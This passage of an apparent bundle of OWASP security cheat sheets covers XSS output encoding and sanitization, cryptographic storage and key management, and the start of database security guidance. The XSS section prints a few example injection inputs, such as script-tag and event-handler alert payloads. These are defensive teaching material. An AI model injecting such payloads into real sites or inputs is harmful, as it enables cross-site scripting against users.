safely display data exactly as a user types it in, output encoding is recommended. Variables should not be interpreted as code instead of text. This section covers each form of output encoding, where to use it, and when you should not use dynamic variables at all.\r\n\r\nFirst, when you wish to display data as the user typed it in, start with your framework’s default output encoding protection. Automatic encoding and escaping functions are built into most frameworks.\r\n\r\nIf you’re not using a framework or need to cover gaps in the framework then you should use an output encoding library. Each variable used in the user interface should be passed through an output encoding function. A list of output encoding libraries is included in the appendix.\r\n\r\nThere are many different output encoding methods because browsers parse HTML, JS, URLs, and CSS differently. Using the wrong encoding method may introduce weaknesses or harm the functionality of your application.\r\n\r\n### Output Encoding for “HTML Contexts”\r\n\r\n“HTML Context” refers to inserting a variable between two basic HTML tags like a `<div>` or `<b>`. For example:\r\n\r\n```HTML\r\n<div> $varUnsafe </div>\r\n```\r\n\r\nAn attacker could modify data that is rendered as `$varUnsafe`. This could lead to an attack being added to a webpage. For example:\r\n\r\n```HTML\r\n<div> <script>alert`1`</script> </div> // Example Attack\r\n```\r\n\r\nIn order to add a variable to a HTML context safely to a web template, use HTML entity encoding for that variable.\r\n\r\nHere are some examples of encoded values for specific characters:\r\n\r\nIf you're using JavaScript for writing to HTML, look at the `.textContent` attribute. It is a **Safe Sink** and will automatically HTML Entity Encode.\r\n\r\n```HTML\r\n&    &amp;\r\n<    &lt;\r\n>    &gt;\r\n\"    &quot;\r\n'    &#x27;\r\n```\r\n\r\n### Output Encoding for “HTML Attribute Contexts”\r\n\r\n“HTML Attribute Contexts” occur when a variable is placed in an HTML attribute value. You may want to do this to change a hyperlink, hide an element, add alt-text for an image, or change inline CSS styles. You should apply HTML attribute encoding to variables being placed in most HTML attributes. A list of safe HTML attributes is provided in the **Safe Sinks** section.\r\n\r\n```HTML\r\n<div attr=\"$varUnsafe\">\r\n<div attr=”*x” onblur=”alert(1)*”> // Example Attack\r\n```\r\n\r\n**It’s critical to use quotation marks like `\"` or `'` to surround your variables.** Quoting makes it difficult to change the context a variable operates in, which helps prevent XSS. Quoting also significantly reduces the characterset that you need to encode, making your application more reliable and the encoding easier to implement.\r\n\r\nIf you're writing to a HTML Attribute with JavaScript, look at the `.setAttribute` and `[attribute]` methods because they will automatically HTML Attribute Encode. Those are **Safe Sinks** as long as the attribute name is hardcoded and innocuous, like `id` or `class`. Generally, attributes that accept JavaScript, such as `onClick`, are **NOT safe** to use with untrusted attribute values.\r\n\r\n### Output Encoding for “JavaScript Contexts”\r\n\r\n“JavaScript Contexts” refers to the situation where variables are placed into inline JavaScript and then embedded in an HTML document. This situation commonly occurs in programs that heavily use custom JavaScript that is embedded in their web pages.\r\n\r\nHowever, the only ‘safe’ location for placing variables in JavaScript is inside a “quoted data value”. All other contexts are unsafe and you should not place variable data in them.\r\n\r\nExamples of “Quoted Data Values”\r\n\r\n```HTML\r\n<script>alert('$varUnsafe’)</script>\r\n<script>x=’$varUnsafe’</script>\r\n<div onmouseover=\"'$varUnsafe'\"</div>\r\n```\r\n\r\nEncode all characters using the `\\xHH` format. Encoding libraries often have a `EncodeForJavaScript` or similar to support this function.\r\n\r\nPlease look at the [OWASP Java Encoder JavaScript encoding examples](https://owasp.org/www-project-java-encoder/) for examples of proper JavaScript use that requires minimal encoding.\r\n\r\nFor JSON, verify that the `Content-Type` header is `application/json` and not `text/html` to prevent XSS.\r\n\r\n### Output Encoding for “CSS Contexts”\r\n\r\n“CSS Contexts” refer to variables placed into inline CSS, which is common when developers want their users to customize the look and feel of their webpages. Since CSS is surprisingly powerful, it has been used for many types of attacks. **Variables should only be placed in a CSS property value. Other “CSS Contexts” are unsafe and you should not place variable data in them.**\r\n\r\n```HTML\r\n<style> selector { property : $varUnsafe; } </style>\r\n<style> selector { property : \"$varUnsafe\"; } </style>\r\n<span style=\"property : $varUnsafe\">Oh no</span>\r\n```\r\n\r\nIf you're using JavaScript to change a CSS property, look into using `style.property = x`. This is a **Safe Sink** and will automatically CSS encode data in it.\r\n\r\n// Add CSS Encoding Advice\r\n\r\n### Output Encoding for “URL Contexts”\r\n\r\n“URL Contexts” refer to variables placed into a URL. Most commonly, a developer will add a parameter or URL fragment to a URL base that is then displayed or used in some operation. Use URL Encoding for these scenarios.\r\n\r\n```HTML\r\n<a href=\"http://www.owasp.org?test=$varUnsafe\">link</a >\r\n```\r\n\r\nEncode all characters with the `%HH` encoding format. Make sure any attributes are fully quoted, same as JS and CSS.\r\n\r\n#### Common Mistake\r\n\r\nThere will be situations where you use a URL in different contexts. The most common one would be adding it to an `href` or `src` attribute of an `<a>` tag. In these scenarios, you should do URL encoding, followed by HTML attribute encoding.\r\n\r\n```HTML\r\nurl = \"https://site.com?data=\" + urlencode(parameter)\r\n<a href='attributeEncode(url)'>link</a>\r\n```\r\n\r\nIf you're using JavaScript to construct a URL Query Value, look into using `window.encodeURIComponent(x)`. This is a **Safe Sink** and will automatically URL encode data in it.\r\n\r\n### Dangerous Contexts\r\n\r\nOutput encoding is not perfect. It will not always prevent XSS. These locations are known as **dangerous contexts**. Dangerous contexts include:\r\n\r\n```HTML\r\n<script>Directly in a script</script>\r\n<!-- Inside an HTML comment -->\r\n<style>Directly in CSS</style>\r\n<div ToDefineAnAttribute=test />\r\n<ToDefineATag href=\"/test\" />\r\n```\r\n\r\nOther areas to be careful with include:\r\n\r\n- Callback functions\r\n- Where URLs are handled in code such as this CSS { background-url : “javascript:alert(xss)”; }\r\n- All JavaScript event handlers (`onclick()`, `onerror()`, `onmouseover()`).\r\n- Unsafe JS functions like `eval()`, `setInterval()`, `setTimeout()`\r\n\r\nDon't place variables into dangerous contexts as even with output encoding, it will not prevent an XSS attack fully.\r\n\r\n## HTML Sanitization\r\n\r\nWhen users need to author HTML, developers may let users change the styling or structure of content inside a WYSIWYG editor. Output encoding in this case will prevent XSS, but it will break the intended functionality of the application. The styling will not be rendered. In these cases, HTML Sanitization should be used.\r\n\r\nHTML Sanitization will strip dangerous HTML from a variable and return a safe string of HTML. OWASP recommends [DOMPurify](https://github.com/cure53/DOMPurify) for HTML Sanitization.\r\n\r\n```js\r\nlet clean = DOMPurify.sanitize(dirty);\r\n```\r\n\r\nThere are some further things to consider:\r\n\r\n- If you sanitize content and then modify it afterwards, you can easily void your security efforts.\r\n- If you sanitize content and then send it to a library for use, check that it doesn’t mutate that string somehow. Otherwise, again, your security efforts are void.\r\n- You must regularly patch DOMPurify or other HTML Sanitization libraries that you use. Browsers change functionality and bypasses are being discovered regularly.\r\n\r\n## Safe Sinks\r\n\r\nSecurity professionals often talk in terms of sources and sinks. If you pollute a river, it'll flow downstream somewhere. It’s the same with computer security. XSS sinks are places where variables are placed into your webpage.\r\n\r\nThankfully, many sinks where variables can be placed are safe. This is because these sinks treat the variable as text and will never execute it. Try to refactor your code to remove references to unsafe sinks like innerHTML, and instead use textContent or value.\r\n\r\n```js\r\nelem.textContent = dangerVariable;\r\nelem.insertAdjacentText(dangerVariable);\r\nelem.className = dangerVariable;\r\nelem.setAttribute(safeName, dangerVariable);\r\nformfield.value = dangerVariable;\r\ndocument.createTextNode(dangerVariable);\r\ndocument.createElement(dangerVariable);\r\nelem.innerHTML = DOMPurify.sanitize(dangerVar);\r\n```\r\n\r\n**Safe HTML Attributes include:** `align`, `alink`, `alt`, `bgcolor`, `border`, `cellpadding`, `cellspacing`, `class`, `color`, `cols`, `colspan`, `coords`, `dir`, `face`, `height`, `hspace`, `ismap`, `lang`, `marginheight`, `marginwidth`, `multiple`, `nohref`, `noresize`, `noshade`, `nowrap`, `ref`, `rel`, `rev`, `rows`, `rowspan`, `scrolling`, `shape`, `span`, `summary`, `tabindex`, `title`, `usemap`, `valign`, `value`, `vlink`, `vspace`, `width`.\r\n\r\nFor a comprehensive list, check out the [DOMPurify allowlist](https://github.com/cure53/DOMPurify/blob/main/src/attrs.js)\r\n\r\n## Other Controls\r\n\r\nFramework Security Protections, Output Encoding, and HTML Sanitization will provide the best protection for your application. OWASP recommends these in all circumstances.\r\n\r\nConsider adopting the following controls in addition to the above.\r\n\r\n- Cookie Attributes - These change how JavaScript and browsers can interact with cookies. Cookie attributes try to limit the impact of an XSS attack but don’t prevent the execution of malicious content or address the root cause of the vulnerability.\r\n- Content Security Policy - An allowlist that prevents content being loaded. It’s easy to make mistakes with the implementation so it should not be your primary defense mechanism. Use a CSP as an additional layer of defense and have a look at the [cheatsheet here](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html).\r\n- Web Application Firewalls - These look for known attack strings and block them. WAF’s are unreliable and new bypass techniques are being discovered regularly. WAFs also don’t address the root cause of an XSS vulnerability. In addition, WAFs also miss a class of XSS vulnerabilities that operate exclusively client-side. WAFs are not recommended for preventing XSS, especially DOM-Based XSS.\r\n\r\n### XSS Prevention Rules Summary\r\n\r\nThese snippets of HTML demonstrate how to render untrusted data safely in a variety of different contexts.\r\n\r\nData Type: String\r\nContext: HTML Body\r\nCode: `<span>UNTRUSTED DATA </span>`\r\nSample Defense: HTML Entity Encoding (rule \\#1)\r\n\r\nData Type: Strong\r\nContext: Safe HTML Attributes\r\nCode: `<input type=\"text\" name=\"fname\" value=\"UNTRUSTED DATA \">`\r\nSample Defense: Aggressive HTML Entity Encoding (rule \\#2), Only place untrusted data into a list of safe attributes (listed below), Strictly validate unsafe attributes such as background, ID and name.\r\n\r\nData Type: String\r\nContext: GET Parameter\r\nCode: `<a href=\"/site/search?value=UNTRUSTED DATA \">clickme</a>`\r\nSample Defense: URL Encoding (rule \\#5).\r\n\r\nData Type: String\r\nContext: Untrusted URL in a SRC or HREF attribute\r\nCode: `<a href=\"UNTRUSTED URL \">clickme</a> <iframe src=\"UNTRUSTED URL \" />`\r\nSample Defense: Canonicalize input, URL Validation, Safe URL verification, Allow-list http and HTTPS URLs only (Avoid the JavaScript Protocol to Open a new Window), Attribute encoder.\r\n\r\nData Type: String\r\nContext: CSS Value\r\nCode: `HTML <div style=\"width: UNTRUSTED DATA ;\">Selection</div>`\r\nSample Defense: Strict structural validation (rule \\#4), CSS hex encoding, Good design of CSS features. J\r\n\r\nData Type: String\r\nContext: JavaScript Variable\r\nCode: `<script>var currentValue='UNTRUSTED DATA ';</script> <script>someFunction('UNTRUSTED DATA ');</script>`\r\nSample Defense: Ensure JavaScript variables are quoted, JavaScript hex encoding, JavaScript Unicode encoding, avoid backslash encoding (`\\\"` or `\\'` or `\\\\`).\r\n\r\nData Type: HTML\r\nContext: HTML Body\r\nCode: `<div>UNTRUSTED HTML</div>`\r\nSample Defense: HTML validation (JSoup, AntiSamy, HTML Sanitizer...).\r\n\r\nData Type: String\r\nContext: DOM XSS\r\nCode: `<script>document.write(\"UNTRUSTED INPUT: \" + document.location.hash );<script/>`\r\nSample Defense: [DOM based XSS Prevention Cheat Sheet](DOM_based_XSS_Prevention_Cheat_Sheet.md) |\r\n\r\n### Output Encoding Rules Summary\r\n\r\nThe purpose of output encoding (as it relates to Cross Site Scripting) is to convert untrusted input into a safe form where the input is displayed as **data** to the user without executing as **code** in the browser. The following charts provides a list of critical output encoding methods needed to stop Cross Site Scripting.\r\n\r\nEncoding Type: HTML Entity\r\nEncoding Mechanism: Convert `&` to `&amp;`, Convert `<` to `&lt;`, Convert `>` to `&gt;`, Convert `\"` to `&quot;`, Convert `'` to `&#x27`\r\n\r\nEncoding Type: HTML Attribute Encoding\r\nEncoding Mechanism: Encode all characters with the HTML Entity `&#xHH;` format, including spaces, where **HH** represents the hexadecimal value of the character in Unicode. For example, `A` becomes `&#x41`. All alphanumeric characters (letters A to Z, a to z, and digits 0 to 9) remain unencoded.\r\n\r\nEncoding Type: URL Encoding\r\nEncoding Mechanism: Use standard percent encoding, as specified in the [W3C specification](http://www.w3.org/TR/html401/interact/forms.html#h-17.13.4.1), to encode parameter values. Be cautious and only encode parameter values, not the entire URL or path fragments of a URL.\r\n\r\nEncoding Type: JavaScript Encoding\r\nEncoding Mechanism: Encode all characters using the Unicode `\\uXXXX` encoding format, where **XXXX** represents the hexadecimal Unicode code point. For example, `A` becomes `\\u0041`. All alphanumeric characters (letters A to Z, a to z, and digits 0 to 9) remain unencoded.\r\n\r\nEncoding Type: CSS Hex Encoding\r\nEncoding Mechanism: CSS encoding supports both `\\XX` and `\\XXXXXX` formats. To ensure proper encoding, consider these options: (a) Add a space after the CSS encode (which will be ignored by the CSS parser), or (b) use the full six-character CSS encoding format by zero-padding the value. For example, `A` becomes `\\41` (short format) or `\\000041` (full format). Alphanumeric characters (letters A to Z, a to z, and digits 0 to 9) remain unencoded.\r\n\r\n## Related Articles\r\n\r\n**XSS Attack Cheat Sheet:**\r\n\r\nThe following article describes how attackers can exploit different kinds of XSS vulnerabilities (and this article was created to help you avoid them):\r\n\r\n- OWASP: [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html).\r\n\r\n**Description of XSS Vulnerabilities:**\r\n\r\n- OWASP article on [XSS](https://owasp.org/www-community/attacks/xss/) Vulnerabilities.\r\n\r\n**Discussion about the Types of XSS Vulnerabilities:**\r\n\r\n- [Types of Cross-Site Scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting).\r\n\r\n**How to Review Code for Cross-Site Scripting Vulnerabilities:**\r\n\r\n- [OWASP Code Review Guide](https://owasp.org/www-project-code-review-guide/) article on [Reviewing Code for Cross-site scripting](https://wiki.owasp.org/index.php/Reviewing_Code_for_Cross-site_scripting) Vulnerabilities.\r\n\r\n**How to Test for Cross-Site Scripting Vulnerabilities:**\r\n\r\n- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) article on testing for Cross-Site Scripting vulnerabilities.\r\n- [XSS Experimental Minimal Encoding Rules](https://wiki.owasp.org/index.php/XSS_Experimental_Minimal_Encoding_Rules)#  <#Title#>\r\n"
    },
    {
      "Cryptographic_Storage_Cheat_Sheet.md": "# Cryptographic Storage Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis article provides a simple model to follow when implementing solutions to protect data at rest.\r\n\r\nPasswords should not be stored using reversible encryption - secure password hashing algorithms should be used instead. The [Password Storage Cheat Sheet](Password_Storage_Cheat_Sheet.md) contains further guidance on storing passwords.\r\n\r\n## Architectural Design\r\n\r\nThe first step in designing any application is to consider the overall architecture of the system, as this will have a huge impact on the technical implementation.\r\n\r\nThis process should begin with considering the [threat model](Threat_Modeling_Cheat_Sheet.md) of the application (i.e, who you are trying to protect that data against).\r\n\r\nThe use of dedicated secret or key management systems can provide an additional layer of security protection, as well as making the management of secrets significantly easier - however it comes at the cost of additional complexity and administrative overhead - so may not be feasible for all applications. Note that many cloud environments provide these services, so these should be taken advantage of where possible. The [Secrets Management Cheat Sheet](Secrets_Management_Cheat_Sheet.md) contains further guidance on this topic.\r\n\r\n### Where to Perform Encryption\r\n\r\nEncryption can be performed on a number of levels in the application stack, such as:\r\n\r\n- At the application level.\r\n- At the database level (e.g, [SQL Server TDE](https://docs.microsoft.com/en-us/sql/relational-databases/security/encryption/transparent-data-encryption?view=sql-server-ver15))\r\n- At the filesystem level (e.g, BitLocker or LUKS)\r\n- At the hardware level (e.g, encrypted RAID cards or SSDs)\r\n\r\nWhich layer(s) are most appropriate will depend on the threat model. For example, hardware level encryption is effective at protecting against the physical theft of the server, but will provide no protection if an attacker is able to compromise the server remotely.\r\n\r\n### Minimise the Storage of Sensitive Information\r\n\r\nThe best way to protect sensitive information is to not store it in the first place. Although this applies to all kinds of information, it is most often applicable to credit card details, as they are highly desirable for attackers, and PCI DSS has such stringent requirements for how they must be stored. Wherever possible, the storage of sensitive information should be avoided.\r\n\r\n## Algorithms\r\n\r\nFor symmetric encryption **AES** with a key that's at least **128 bits** (ideally **256 bits**) and a secure [mode](#cipher-modes) should be used as the preferred algorithm.\r\n\r\nFor asymmetric encryption, use elliptical curve cryptography (ECC) with a secure curve such as **Curve25519** as a preferred algorithm. If ECC is not available and  **RSA** must be used, then ensure that the key is at least **2048 bits**.\r\n\r\nMany other symmetric and asymmetric algorithms are available which have their own pros and cons, and they may be better or worse than AES or Curve25519 in specific use cases. When considering these, a number of factors should be taken into account, including:\r\n\r\n- Key size.\r\n- Known attacks and weaknesses of the algorithm.\r\n- Maturity of the algorithm.\r\n- Approval by third parties such as [NIST's algorithmic validation program](https://csrc.nist.gov/projects/cryptographic-algorithm-validation-program).\r\n- Performance (both for encryption and decryption).\r\n- Quality of the libraries available.\r\n- Portability of the algorithm (i.e, how widely supported is it).\r\n\r\nIn some cases there may be regulatory requirements that limit the algorithms that can be used, such as [FIPS 140-2](https://csrc.nist.gov/csrc/media/publications/fips/140/2/final/documents/fips1402annexa.pdf) or [PCI DSS](https://www.pcisecuritystandards.org/pci_security/glossary#Strong%20Cryptography).\r\n\r\n### Custom Algorithms\r\n\r\nDon't do this.\r\n\r\n### Cipher Modes\r\n\r\nThere are various [modes](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation) that can be used to allow block ciphers (such as AES) to encrypt arbitrary amounts of data, in the same way that a stream cipher would. These modes have different security and performance characteristics, and a full discussion of them is outside the scope of this cheat sheet. Some of the modes have requirements to generate secure initialisation vectors (IVs) and other attributes, but these should be handled automatically by the library.\r\n\r\nWhere available, authenticated modes should always be used. These provide guarantees of the integrity and authenticity of the data, as well as confidentiality. The most commonly used authenticated modes are **[GCM](https://en.wikipedia.org/wiki/Galois/Counter_Mode)** and **[CCM](https://en.wikipedia.org/wiki/CCM_mode)**, which should be used as a first preference.\r\n\r\nIf GCM or CCM are not available, then [CTR](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_%28CTR%29) mode or [CBC](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_Block_Chaining_%28CBC%29) mode should be used. As these do not provide any guarantees about the authenticity of the data, separate authentication should be implemented, such as using the [Encrypt-then-MAC](https://en.wikipedia.org/wiki/Authenticated_encryption#Encrypt-then-MAC_%28EtM%29) technique. Care needs to be taken when using this method with [variable length messages](https://en.wikipedia.org/wiki/CBC-MAC#Security_with_fixed_and_variable-length_messages)\r\n\r\n[ECB](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#ECB) should not be used outside of very specific circumstances.\r\n\r\n### Random Padding\r\n\r\nFor RSA, it is essential to enable Random Padding. Random Padding is also known as OAEP or Optimal Asymmetric Encryption Padding. This class of defense protects against Known Plain Text Attacks by adding randomness at the beginning of the payload.\r\n\r\nThe Padding Schema of [PKCS#1](https://wikipedia.org/wiki/RSA_(cryptosystem)#Padding_schemes) is typically used in this case.\r\n\r\n### Secure Random Number Generation\r\n\r\nRandom numbers (or strings) are needed for various security critical functionality, such as generating encryption keys, IVs, session IDs, CSRF tokens or password reset tokens. As such, it is important that these are generated securely, and that it is not possible for an attacker to guess and predict them.\r\n\r\nIt is generally not possible for computers to generate truly random numbers (without special hardware), so most systems and languages provide two different types of randomness.\r\n\r\nPseudo-Random Number Generators (PRNG) provide low-quality randomness that are much faster, and can be used for non-security related functionality (such as ordering results on a page, or randomising UI elements). However, they **must not** be used for anything security critical, as it is often possible for attackers to guess or predict the output.\r\n\r\nCryptographically Secure Pseudo-Random Number Generators (CSPRNG) are designed to produce a much higher quality of randomness (more strictly, a greater amount of entropy), making them safe to use for security-sensitive functionality. However, they are slower and more CPU intensive, can end up blocking in some circumstances when large amounts of random data are requested. As such, if large amounts of non-security related randomness are needed, they may not be appropriate.\r\n\r\nThe table below shows the recommended algorithms for each language, as well as insecure functions that should not be used.\r\n\r\n| Language    | Unsafe Functions                                                                                                                   | Cryptographically Secure Functions                                                                                                                                                                                                                                                                                                                                         |\r\n|-------------|------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\r\n| C           | `random()`, `rand()`                                                                                                               | [getrandom(2)](http://man7.org/linux/man-pages/man2/getrandom.2.html) |\r\n| Java        | `Math.random()`, `StrictMath.random()`, `java.util.Random`, `java.util.SplittableRandom`, `java.util.concurrent.ThreadLocalRandom` | [java.security.SecureRandom](https://docs.oracle.com/javase/8/docs/api/java/security/SecureRandom.html), [java.util.UUID.randomUUID()](https://docs.oracle.com/javase/8/docs/api/java/util/UUID.html#randomUUID--) |\r\n| PHP         | `array_rand()`, `lcg_value()`, `mt_rand()`, `rand()`, `uniqid()`                                                                   | [random_bytes()](https://www.php.net/manual/en/function.random-bytes.php), [Random\\Engine\\Secure](https://www.php.net/manual/en/class.random-engine-secure.php) in PHP 8, [random_int()](https://www.php.net/manual/en/function.random-int.php) in PHP 7, [openssl_random_pseudo_bytes()](https://www.php.net/manual/en/function.openssl-random-pseudo-bytes.php) in PHP 5 |\r\n| .NET/C#     | `Random()`                                                                                                                         | [RandomNumberGenerator](https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.randomnumbergenerator?view=net-6.0) |\r\n| Objective-C | `arc4random()`/`arc4random_uniform()` (Uses RC4 Cipher), subclasses of`GKRandomSource`, rand(), random()                           | [SecRandomCopyBytes](https://developer.apple.com/documentation/security/1399291-secrandomcopybytes?language=objc) |\r\n| Python      | `random()`                                                                                                                         | [secrets()](https://docs.python.org/3/library/secrets.html#module-secrets) |\r\n| Ruby        | `rand()`, `Random`                                                                                                                 | [SecureRandom](https://ruby-doc.org/stdlib-2.5.1/libdoc/securerandom/rdoc/SecureRandom.html) |\r\n| Go          | `rand` using `math/rand` package                                                                                                   | [crypto.rand](https://golang.org/pkg/crypto/rand/) package |\r\n| Rust        | `rand::prng::XorShiftRng`                                                                                                          | [rand::prng::chacha::ChaChaRng](https://docs.rs/rand/0.5.0/rand/prng/chacha/struct.ChaChaRng.html) and the rest of the Rust library [CSPRNGs.](https://docs.rs/rand/0.5.0/rand/prng/index.html#cryptographically-secure-pseudo-random-number-generators-csprngs) |\r\n| Node.js     | `Math.random()`                                                                                                                    | [crypto.randomBytes()](https://nodejs.org/api/crypto.html#cryptorandombytessize-callback), [crypto.randomInt()](https://nodejs.org/api/crypto.html#cryptorandomintmin-max-callback), [crypto.randomUUID()](https://nodejs.org/api/crypto.html#cryptorandomuuidoptions) |\r\n\r\n#### UUIDs and GUIDs\r\n\r\nUniversally unique identifiers (UUIDs or GUIDs) are sometimes used as a quick way to generate random strings. Although they can provide a reasonable source of randomness, this will depend on the [type or version](https://en.wikipedia.org/wiki/Universally_unique_identifier#Versions) of the UUID that is created.\r\n\r\nSpecifically, version 1 UUIDs are comprised of a high precision timestamp and the MAC address of the system that generated them, so are **not random** (although they may be hard to guess, given the timestamp is to the nearest 100ns). Type 4 UUIDs are randomly generated, although whether this is done using a CSPRNG will depend on the implementation. Unless this is known to be secure in the specific language or framework, the randomness of UUIDs should not be relied upon.\r\n\r\n### Defence in Depth\r\n\r\nApplications should be designed to still be secure even if cryptographic controls fail. Any information that is stored in an encrypted form should also be protected by additional layers of security. Application should also not rely on the security of encrypted URL parameters, and should enforce strong access control to prevent unauthorised access to information.\r\n\r\n## Key Management\r\n\r\n### Processes\r\n\r\nFormal processes should be implemented (and tested) to cover all aspects of key management, including:\r\n\r\n- Generating and storing new keys.\r\n- Distributing keys to the required parties.\r\n- Deploying keys to application servers.\r\n- Rotating and decommissioning old keys\r\n\r\n### Key Generation\r\n\r\nKeys should be randomly generated using a cryptographically secure function, such as those discussed in the [Secure Random Number Generation](#secure-random-number-generation) section. Keys **should not** be based on common words or phrases, or on \"random\" characters generated by mashing the keyboard.\r\n\r\nWhere multiple keys are used (such as data separate data-encrypting and key-encrypting keys), they should be fully independent from each other.\r\n\r\n### Key Lifetimes and Rotation\r\n\r\nEncryption keys should be changed (or rotated) based on a number of different criteria:\r\n\r\n- If the previous key is known (or suspected) to have been compromised.\r\n    - This could also be caused by a someone who had access to the key leaving the organisation.\r\n- After a specified period of time has elapsed (known as the cryptoperiod).\r\n    - There are many factors that could affect what an appropriate cryptoperiod is, including the size of the key, the sensitivity of the data, and the threat model of the system. See section 5.3 of [NIST SP 800-57](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r4.pdf) for further guidance.\r\n- After the key has been used to encrypt a specific amount of data.\r\n    - This would typically be `2^35` bytes (~34GB) for 64-bit keys and `2^68` bytes (~295 exabytes) for 128-bit block size.\r\n- If there is a significant change to the security provided by the algorithm (such as a new attack being announced).\r\n\r\nOnce one of these criteria have been met, a new key should be generated and used for encrypting any new data. There are two main approaches for how existing data that was encrypted with the old key(s) should be handled:\r\n\r\n1. Decrypting it and re-encrypting it with the new key.\r\n2. Marking each item with the ID of the key that was used to encrypt it, and storing multiple keys to allow the old data to be decrypted.\r\n\r\nThe first option should generally be preferred, as it greatly simplifies both the application code and key management processes; however, it may not always be feasible. Note that old keys should generally be stored for a certain period after they have been retired, in case old backups of copies of the data need to be decrypted.\r\n\r\nIt is important that the code and processes required to rotate a key are in place **before** they are required, so that keys can be quickly rotated in the event of a compromise. Additionally, processes should also be implemented to allow the encryption algorithm or library to be changed, in case a new vulnerability is found in the algorithm or implementation.\r\n\r\n## Key Storage\r\n\r\nSecurely storing cryptographic keys is one of the hardest problems to solve, as the application always needs to have some level of access to the keys in order to decrypt the data. While it may not be possible to fully protect the keys from an attacker who has fully compromised the application, a number of steps can be taken to make it harder for them to obtain the keys.\r\n\r\nWhere available, the secure storage mechanisms provided by the operating system, framework or cloud service provider should be used. These include:\r\n\r\n- A physical Hardware Security Module (HSM).\r\n- A virtual HSM.\r\n- Key vaults such as [Amazon KMS](https://aws.amazon.com/kms/) or [Azure Key Vault](https://azure.microsoft.com/en-gb/services/key-vault/).\r\n- An external secrets management service such as [Conjur](https://github.com/cyberark/conjur) or [HashiCorp Vault](https://github.com/hashicorp/vault).\r\n- Secure storage APIs provided by the [ProtectedData](https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.protecteddata?redirectedfrom=MSDN&view=netframework-4.8) class in the .NET framework.\r\n\r\nThere are many advantages to using these types of secure storage over simply putting keys in configuration files. The specifics of these will vary depending on the solution used, but they include:\r\n\r\n- Central management of keys, especially in containerised environments.\r\n- Easy key rotation and replacement.\r\n- Secure key generation.\r\n- Simplifying compliance with regulatory standards such as FIPS 140 or PCI DSS.\r\n- Making it harder for an attacker to export or steal keys.\r\n\r\nIn some cases none of these will be available, such as in a shared hosting environment, meaning that it is not possible to obtain a high degree of protection for any encryption keys. However, the following basic rules can still be followed:\r\n\r\n- Do not hard-code keys into the application source code.\r\n- Do not check keys into version control systems.\r\n- Protect the configuration files containing the keys with restrictive permissions.\r\n- Avoid storing keys in environment variables, as these can be accidentally exposed through functions such as [phpinfo()](https://www.php.net/manual/en/function.phpinfo.php) or through the `/proc/self/environ` file.\r\n\r\nThe [Secrets Management Cheat Sheet](Secrets_Management_Cheat_Sheet.md) provides more details on securely storing secrets.\r\n\r\n### Separation of Keys and Data\r\n\r\nWhere possible, encryption keys should be stored in a separate location from encrypted data. For example, if the data is stored in a database, the keys should be stored in the filesystem. This means that if an attacker only has access to one of these (for example through directory traversal or SQL injection), they cannot access both the keys and the data.\r\n\r\nDepending on the architecture of the environment, it may be possible to store the keys and data on separate systems, which would provide a greater degree of isolation.\r\n\r\n### Encrypting Stored Keys\r\n\r\nWhere possible, encryption keys should themselves be stored in an encrypted form. At least two separate keys are required for this:\r\n\r\n- The Data Encryption Key (DEK) is used to encrypt the data.\r\n- The Key Encryption Key (KEK) is used to encrypt the DEK.\r\n\r\nFor this to be effective, the KEK must be stored separately from the DEK. The encrypted DEK can be stored with the data, but will only be usable if an attacker is able to also obtain the KEK, which is stored on another system.\r\n\r\nThe KEK should also be at least as strong as the DEK. The [envelope encryption](https://cloud.google.com/kms/docs/envelope-encryption) guidance from Google contains further details on how to manage DEKs and KEKs.\r\n\r\nIn simpler application architectures (such as shared hosting environments) where the KEK and DEK cannot be stored separately, there is limited value to this approach, as an attacker is likely to be able to obtain both of the keys at the same time. However, it can provide an additional barrier to unskilled attackers.\r\n\r\nA key derivation function (KDF) could be used to generate a KEK from user-supplied input (such a passphrase), which would then be used to encrypt a randomly generated DEK. This allows the KEK to be easily changed (when the user changes their passphrase), without needing to re-encrypt the data (as the DEK remains the same).\r\n"
    },
    {
      "Database_Security_Cheat_Sheet.md": "# Database Security Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis cheat sheet provides guidance on securely configuring and using the SQL and NoSQL databases. It is intended to be used by application developers when they are responsible for managing the databases, in the absence of a dedicated database administrator (DBA). For details about protecting against SQL Injection attacks, see the [SQL Injection Prevention Cheat Sheet](SQL_Injection_Prevention_Cheat_Sheet.md).\r\n\r\n## Connecting to the Database\r\n\r\nThe backend database used by the application should be isolated as much as possible, in order to prevent malicious or undesirable users from being able to connect to it. Exactly how this is achieved will depend on the system and network architecture. The following options could be used to protect it:\r\n\r\n- Disabling network (TCP) access and requiring all access is over a local socket file or named pipe.\r\n- Configuring the database to only bind on localhost.\r\n- Restricting access to the network port to specific hosts with firewall rules.\r\n- Placing the database server in a separate DMZ isolated from the application server.\r\n\r\nSimilar protection should be implemented to protect any web-based management tools used with the database, such as phpMyAdmin.\r\n\r\nWhen an application is running on an untrusted system (such as a thick-client), it should always connect to the backend through an API that can enforce appropriate access control and restrictions. Direct connections should **never** be made from a thick client to the backend database.\r\n\r\n### Transport Layer Protection\r\n\r\nMost databases will allow unencrypted network connections in their default configurations. Although some will encrypt the initial authentication (such as Microsoft SQL Server), the rest of the traffic will be unencrypted, meaning that all kinds of sensitive information will be sent across the network in clear text. The following steps should be taken to prevent unencrypted traffic:\r\n\r\n- Configure the database to only allow encrypted connections.\r\n- Install a trusted digital certificate on the server.\r\n- Configure the client application to connect using TLSv1.2+ with modern ciphers (e.g, AES-GCM or ChaCha20).\r\n- Configure the client application to verify that the digital certificate is correct.\r\n\r\nThe [Transport Layer 